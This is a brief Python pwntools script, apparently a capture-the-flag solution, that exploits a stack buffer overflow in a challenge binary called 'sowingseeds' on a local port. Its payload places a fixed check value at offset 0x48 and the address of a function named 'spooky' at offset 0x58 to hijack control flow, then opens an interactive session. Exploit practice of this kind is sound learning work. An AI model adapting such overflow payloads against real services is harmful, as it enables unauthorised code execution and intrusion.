#!/usr/bin/env python3
from pwn import *

elf = ELF("./sowingseeds")

#p = process("./sowingseeds")
p = remote("127.0.0.1", 30006)

payload = flat({
    0x48:  p64(0x6b8b4567),
    0x58:  p64(elf.symbols["spooky"]),
    0x80: 0
})
print(payload)

p.recvline()
p.sendline(payload)



p.interactive()
p.close()
